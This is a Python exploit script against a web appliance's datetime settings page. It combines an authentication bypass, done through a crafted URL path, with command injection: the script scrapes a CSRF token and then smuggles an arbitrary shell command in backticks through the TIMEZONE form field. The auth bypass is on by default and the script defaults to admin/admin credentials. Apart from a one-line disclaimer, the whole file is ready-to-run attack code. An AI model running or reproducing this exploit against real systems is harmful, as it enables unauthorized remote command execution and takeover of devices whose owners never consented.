import requests
import re
import sys
import argparse
import datetime
from requests.auth import HTTPBasicAuth
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(url, username, password, command, skip_auth=True):
    print("[!] WARNING: This script is for authorized testing and educational purposes only. Unauthorized use is illegal.")

    s = requests.Session()

    target_url = f"{url}/gsb/datetime.php"
    if skip_auth:
        target_url = f"{url}/client/index.php%3F.php/gsb/datetime.php"

    print(f"[*] Fetching {target_url}...")
    auth = HTTPBasicAuth(username, password)
    r = s.get(target_url, auth=auth, verify=False)

    m = re.search(r"name=['\"]LDCSA_CSRF['\"]\s+value=['\"]([^'\"]+)['\"]", r.text)
    if m:
        ldcsa = m.group(1)
        print(f"[+] Got LDCSA_CSRF value: {ldcsa}")
    else:
        print("[-] Failed getting LDCSA_CRSF token")
        sys.exit(0)

    now = datetime.datetime.now()
    payload = {
        "dateTimeFormSubmitted": "1",
        "TIMEZONE": f"; `{command}` ;",
        "CYEAR": str(now.year),
        "CMONTH": str(now.month),
        "CDAY": str(now.day),
        "CHOUR": "1",
        "CMIN": "1",
        "LDCSA_CSRF": ldcsa,
        "SUBMIT_TIME": "Save"
    }

    print("[*] Sending payload...")
    try:
        r = s.post(target_url, auth=auth, verify=False, data=payload, timeout=20)
        print("[+] Exploit sent! Check for command execution.")
    except requests.exceptions.Timeout:
        print("[!] Request timed out. Check if the command executed on the target.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script with auth bypass support")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("command", help="Command to execute")
    parser.add_argument("-u", "--username", help="Username for HTTP Basic Auth", default="admin")
    parser.add_argument("-p", "--password", help="Password for HTTP Basic Auth", default="admin")
    parser.add_argument("--skip-auth", action="store_true", help="Bypass auth and modify URL structure (default: enabled)", default=True)

    args = parser.parse_args()
    exploit(args.url, args.username, args.password, args.command, args.skip_auth)